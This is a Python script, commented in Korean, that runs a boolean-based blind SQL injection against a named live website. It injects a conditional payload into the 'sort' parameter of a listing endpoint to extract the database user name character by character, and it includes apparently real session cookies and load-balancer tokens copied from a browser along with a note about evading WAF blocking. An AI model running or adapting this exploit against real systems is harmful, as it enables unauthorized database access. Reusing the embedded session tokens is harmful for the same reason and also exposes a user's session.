import requests
import time

# 1. 대상 URL 및 설정
TARGET_URL = "https://www.skintellixservice.com/web/voc/getMyArticleList.do"
USER_LENGTH = 16

# 2. 브라우저에서 복사한 헤더 및 쿠키 설정
HEADERS = {
    "Host": "www.skintellixservice.com",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Cookie": "_gid=GA1.2.1422337521.1774915805; MSESSIONID=7100B86B930AB3A224608A9C14ECDB33.skmg-sc-fo1; _gat_gtag_UA_182848614_2=1; _ga=GA1.1.1939520434.1774915805; _ga_P5TZKGMPP7=GS2.1.s1774939627$o4$g1$t1774939977$j37$l0$h0; _ga_Z6HY698JL8=GS2.1.s1774939627$o4$g1$t1774939977$j37$l0$h0; AWSALB=7iX7zhj3RsHSOSfGtZbaJ+gWylcZhOHAEAYp9MRVHiV+lATbu1qzEZ1EGoH77HLSd/ALCLWcWFputnVntpYvuaKUGQf0qpOEIlRs3ueAiKbLoyWAmvORNn4Phk1/; AWSALBCORS=7iX7zhj3RsHSOSfGtZbaJ+gWylcZhOHAEAYp9MRVHiV+lATbu1qzEZ1EGoH77HLSd/ALCLWcWFputnVntpYvuaKUGQf0qpOEIlRs3ueAiKbLoyWAmvORNn4Phk1/"
}

# 3. 판별 기준 문자열 (순서 확인용)
TRUE_STR = "Security Testing"
FALSE_STR = "보안 점검 게시글 입니다."

def exploit():
    extracted_user = ""
    print(f"[+] DB User 추출 시작 (Target: {USER_LENGTH} chars)")
    print("-" * 50)

    for i in range(1, USER_LENGTH + 1):
        for char_code in range(32, 127):
            # 주입할 SQL 페이로드 (sort 파라미터에 삽입)
            sql_payload = f"IF(ASCII(SUBSTR(USER(),{i},1))={char_code},REG_DT,VOC_TITLE)"
            
            params = {
                "vocTyp": "01",
                "limit": "10",
                "offset": "0",
                "page": "1",
                "order": "DESC",
                "sort": sql_payload
            }

            try:
                # 0.5초 간격으로 요청 (WAF 차단 방지용, 필요시 조절)
                # time.sleep(0.3) 
                
                response = requests.get(TARGET_URL, params=params, headers=HEADERS, timeout=10, verify=True)
                res_text = response.text

                # 인덱스 비교를 통한 정렬 순서 판별
                true_pos = res_text.find(TRUE_STR)
                false_pos = res_text.find(FALSE_STR)

                # 참일 때: Security Testing이 보안 점검 게시글보다 먼저 나옴
                if true_pos != -1 and false_pos != -1 and true_pos < false_pos:
                    extracted_user += chr(char_code)
                    print(f" [Found] Position {i:02}: {chr(char_code)} (Current: {extracted_user})")
                    print(char_code)
                    break
            
            except Exception as e:
                print(f" [Error] {e}")
                continue

    print("-" * 50)
    print(f"[★] Final DB User: {extracted_user}")

if __name__ == "__main__":
    exploit()
